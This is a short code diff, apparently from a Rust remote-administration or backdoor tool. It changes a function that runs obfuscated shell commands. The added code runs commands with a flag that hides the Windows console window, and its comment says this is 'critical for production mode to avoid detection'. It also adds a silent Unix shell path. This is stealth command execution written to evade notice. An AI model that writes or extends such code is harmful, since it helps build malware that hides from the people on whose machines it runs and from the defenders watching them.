@@ -795,7 +795,22 @@ fn execute_command(command: &str) -> String {
     debug_print!("DEBUG: Comando original: {}", command);
     debug_print!("DEBUG: Comando ofuscado: {}", obfuscated_cmd);
 
-    let output = Command::new("cmd").args(&["/C", &obfuscated_cmd]).output();
+    // Use CREATE_NO_WINDOW flag (0x08000000) to hide command prompt window
+    // This is critical for production mode to avoid detection
+    #[cfg(target_os = "windows")]
+    let output = {
+        use std::os::windows::process::CommandExt;
+        Command::new("cmd")
+            .args(&["/C", &obfuscated_cmd])
+            .creation_flags(0x08000000) // CREATE_NO_WINDOW
+            .output()
+    };
+
+    #[cfg(not(target_os = "windows"))]
+    let output = Command::new("sh")
+        .args(&["-c", &obfuscated_cmd])
+        .output();
+
     match output {
         Ok(out) => {
             let stdout = String::from_utf8_lossy(&out.stdout);
